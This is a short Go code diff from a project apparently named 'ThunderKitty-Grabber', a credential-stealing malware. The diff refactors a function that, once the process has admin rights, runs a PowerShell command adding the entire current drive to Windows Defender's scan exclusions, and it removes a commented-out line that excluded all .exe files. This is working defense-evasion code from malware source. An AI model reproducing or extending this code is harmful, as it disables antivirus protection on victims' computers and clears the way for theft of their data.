@@ -1,7 +1,7 @@
 package Exclude
 
 import (
-	Persistence "ThunderKitty-Grabber/utils/persistence"
+	Common "ThunderKitty-Grabber/utils/common"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -10,7 +10,7 @@ import (
 )
 
 func ExcludeDrive() {
-	if !Persistence.IsAdmin() {
+	if !Common.IsElevated() {
 		return
 	}
 	dir, err := os.Getwd()
@@ -20,10 +20,6 @@ func ExcludeDrive() {
 	}
 
 	vol := filepath.VolumeName(dir)
-
-	// Legacy code
-	//wdsmd := `powershell -Command "Set-MpPreference -ExclusionExtension *.exe -Force"`
-	//line, _ := syscall.UTF16PtrFromString(wdsmd)
 
 	wdsmd := fmt.Sprintf(`powershell -C "Add-MpPreference -ExclusionPath '%v'"`, vol)
 	line, _ := syscall.UTF16PtrFromString(wdsmd)
